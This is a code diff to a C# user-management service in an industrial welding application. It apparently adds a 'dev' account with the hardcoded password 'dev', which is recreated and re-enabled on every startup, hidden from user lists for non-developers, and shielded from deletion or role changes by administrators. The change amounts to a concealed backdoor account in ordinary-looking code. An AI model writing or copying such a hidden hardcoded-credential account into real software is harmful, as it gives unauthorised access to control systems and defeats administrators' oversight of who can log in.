@@ -3,9 +3,9 @@ using System.Text;
 using AutoWeldSystem.Core;
 using AutoWeldSystem.Core.Constants;
 using AutoWeldSystem.Core.DTOs;
+using AutoWeldSystem.Core.Entities;
 using AutoWeldSystem.Core.Exceptions;
-using AutoWeldSystem.Core.Interfaces;
-using AutoWeldSystem.Core.Models;
+using AutoWeldSystem.Core.Interfaces.UserManage;
 using AutoWeldSystem.Data;
 
 namespace AutoWeldSystem.Services;
@@ -25,49 +25,49 @@ public class SysUserService : ISysUserService
     {
         _dbContext.InitDatabase();
         _rbacService.InitializeRbac();
-        MigrateLegacyUsers();
 
-        if (_dbContext.Db.Queryable<SysUser>().Any())
+        var hasAnyUser = _dbContext.Db.Queryable<SysUser>().Any();
+        if (!hasAnyUser)
         {
-            return;
+            var adminRole = _rbacService.GetRoleByCode(AppConstants.Roles.Admin)
+                ?? throw new InvalidOperationException("Admin role is missing.");
+            var operatorRole = _rbacService.GetRoleByCode(AppConstants.Roles.Operator)
+                ?? throw new InvalidOperationException("Operator role is missing.");
+            var readonlyRole = _rbacService.GetRoleByCode(AppConstants.Roles.Readonly)
+                ?? throw new InvalidOperationException("Readonly role is missing.");
+
+            var seedUsers = new[]
+            {
+                new SysUser
+                {
+                    UserNumber = "admin",
+                    UserName = "Administrator",
+                    RoleId = adminRole.Id,
+                    Role = adminRole.RoleCode,
+                    PasswordHash = Hash(AppConstants.Defaults.InitialPassword)
+                },
+                new SysUser
+                {
+                    UserNumber = "operator",
+                    UserName = "Operator",
+                    RoleId = operatorRole.Id,
+                    Role = operatorRole.RoleCode,
+                    PasswordHash = Hash(AppConstants.Defaults.InitialPassword)
+                },
+                new SysUser
+                {
+                    UserNumber = "readonly",
+                    UserName = "Readonly",
+                    RoleId = readonlyRole.Id,
+                    Role = readonlyRole.RoleCode,
+                    PasswordHash = Hash(AppConstants.Defaults.InitialPassword)
+                }
+            };
+
+            _dbContext.Db.Insertable(seedUsers).ExecuteCommand();
         }
 
-        var adminRole = _rbacService.GetRoleByCode(AppConstants.Roles.Admin)
-            ?? throw new InvalidOperationException("Admin role is missing.");
-        var operatorRole = _rbacService.GetRoleByCode(AppConstants.Roles.Operator)
-            ?? throw new InvalidOperationException("Operator role is missing.");
-        var readonlyRole = _rbacService.GetRoleByCode(AppConstants.Roles.Readonly)
-            ?? throw new InvalidOperationException("Readonly role is missing.");
-
-        var seedUsers = new[]
-        {
-            new SysUser
-            {
-                UserNumber = "admin",
-                UserName = "Administrator",
-                RoleId = adminRole.Id,
-                Role = adminRole.RoleCode,
-                PasswordHash = Hash(AppConstants.Defaults.InitialPassword)
-            },
-            new SysUser
-            {
-                UserNumber = "operator",
-                UserName = "Operator",
-                RoleId = operatorRole.Id,
-                Role = operatorRole.RoleCode,
-                PasswordHash = Hash(AppConstants.Defaults.InitialPassword)
-            },
-            new SysUser
-            {
-                UserNumber = "readonly",
-                UserName = "Readonly",
-                RoleId = readonlyRole.Id,
-                Role = readonlyRole.RoleCode,
-                PasswordHash = Hash(AppConstants.Defaults.InitialPassword)
-            }
-        };
-
-        _dbContext.Db.Insertable(seedUsers).ExecuteCommand();
+        EnsureDeveloperUser();
     }
 
     public UserLoginResult Login(string userNumber, string password)
@@ -122,6 +122,11 @@ public class SysUserService : ISysUserService
         }
 
         PopulateRole(user);
+        if (IsDeveloperUser(user) && !IsCurrentDeveloper())
+        {
+            return null;
+        }
+
         return user;
     }
 
@@ -131,6 +136,11 @@ public class SysUserService : ISysUserService
         foreach (var user in users)
         {
             PopulateRole(user);
+        }
+
+        if (!IsCurrentDeveloper())
+        {
+            users = users.Where(user => !IsDeveloperUser(user)).ToList();
         }
 
         return users;
@@ -149,6 +159,12 @@ public class SysUserService : ISysUserService
 
         var role = ResolveRole(user.RoleId, user.Role);
         if (role is null || !role.Enabled)
+        {
+            throw new UserFriendlyException(TextKeys.User.InvalidRole);
+        }
+
+        var existingUser = user.Id > 0 ? _dbContext.Db.Queryable<SysUser>().InSingle(user.Id) : null;
+        if (((existingUser is not null && IsDeveloperUser(existingUser)) || IsDeveloperRole(role)) && !IsCurrentDeveloper())
         {
             throw new UserFriendlyException(TextKeys.User.InvalidRole);
         }
@@ -210,6 +226,12 @@ public class SysUserService : ISysUserService
             return false;
         }
 
+        var user = _dbContext.Db.Queryable<SysUser>().InSingle(id);
+        if (user is not null && IsDeveloperUser(user) && !IsCurrentDeveloper())
+        {
+            return false;
+        }
+
         return _dbContext.Db.Deleteable<SysUser>(id).ExecuteCommand() > 0;
     }
 
@@ -218,6 +240,11 @@ public class SysUserService : ISysUserService
         var user = GetUserById(userId);
         var role = _rbacService.GetRoleById(roleId);
         if (user is null || role is null || !role.Enabled)
+        {
+            return false;
+        }
+
+        if ((IsDeveloperUser(user) || IsDeveloperRole(role)) && !IsCurrentDeveloper())
         {
             return false;
         }
@@ -248,44 +275,38 @@ public class SysUserService : ISysUserService
         return _rbacService.GetPermissionCodesByUser(user.Id);
     }
 
-    private void MigrateLegacyUsers()
+    private void EnsureDeveloperUser()
     {
-        var operatorRole = _rbacService.GetRoleByCode(AppConstants.Roles.Operator)
-            ?? throw new InvalidOperationException("Operator role is missing.");
+        var developerRole = _rbacService.GetRoleByCode(AppConstants.Roles.Developer)
+            ?? throw new InvalidOperationException("Developer role is missing.");
+        var developer = _dbContext.Db.Queryable<SysUser>()
+            .First(user => user.UserNumber == "dev");
 
-        var users = _dbContext.Db.Queryable<SysUser>().ToList();
-        foreach (var user in users)
+        if (developer is null)
         {
-            var shouldUpdate = false;
-            var role = ResolveRole(user.RoleId, user.Role) ?? operatorRole;
-
-            if (user.RoleId != role.Id)
+            _dbContext.Db.Insertable(new SysUser
             {
-                user.RoleId = role.Id;
-                shouldUpdate = true;
-            }
-
-            if (!string.Equals(user.Role, role.RoleCode, StringComparison.OrdinalIgnoreCase))
-            {
-                user.Role = role.RoleCode;
-                shouldUpdate = true;
-            }
-
-            if (!user.UpdatedTime.HasValue || user.UpdatedTime.Value == default)
-            {
-                user.UpdatedTime = user.CreatedTime == default ? DateTime.Now : user.CreatedTime;
-                shouldUpdate = true;
-            }
-
-            if (!shouldUpdate)
-            {
-                continue;
-            }
-
-            _dbContext.Db.Updateable(user)
-                .UpdateColumns(it => new { it.RoleId, it.Role, it.UpdatedTime })
-                .ExecuteCommand();
+                UserNumber = "dev",
+                UserName = "Developer",
+                RoleId = developerRole.Id,
+                Role = developerRole.RoleCode,
+                PasswordHash = Hash("dev"),
+                Enabled = true,
+                CreatedTime = DateTime.Now,
+                UpdatedTime = DateTime.Now
+            }).ExecuteCommand();
+            return;
         }
+
+        developer.UserName = string.IsNullOrWhiteSpace(developer.UserName) ? "Developer" : developer.UserName.Trim();
+        developer.RoleId = developerRole.Id;
+        developer.Role = developerRole.RoleCode;
+        developer.PasswordHash = Hash("dev");
+        developer.Enabled = true;
+        developer.UpdatedTime = DateTime.Now;
+        _dbContext.Db.Updateable(developer)
+            .UpdateColumns(user => new { user.UserName, user.RoleId, user.Role, user.PasswordHash, user.Enabled, user.UpdatedTime })
+            .ExecuteCommand();
     }
 
     private SysRole? ResolveRole(int roleId, string? roleCode)
@@ -322,6 +343,25 @@ public class SysUserService : ISysUserService
         user.RoleId = role.Id;
         user.Role = role.RoleCode;
         user.RoleName = role.RoleName;
+    }
+
+    private static bool IsDeveloperRole(SysRole role)
+    {
+        return string.Equals(role.RoleCode, AppConstants.Roles.Developer, StringComparison.OrdinalIgnoreCase);
+    }
+
+    private static bool IsDeveloperUser(SysUser user)
+    {
+        return string.Equals(user.UserNumber, "dev", StringComparison.OrdinalIgnoreCase)
+            || string.Equals(user.Role, AppConstants.Roles.Developer, StringComparison.OrdinalIgnoreCase);
+    }
+
+    private static bool IsCurrentDeveloper()
+    {
+        var currentUser = GlobalContext.CurrentUser;
+        return currentUser is not null
+            && (string.Equals(currentUser.UserNumber, "dev", StringComparison.OrdinalIgnoreCase)
+                || string.Equals(currentUser.Role, AppConstants.Roles.Developer, StringComparison.OrdinalIgnoreCase));
     }
 
     private void RefreshCurrentUserContext(SysUser user)
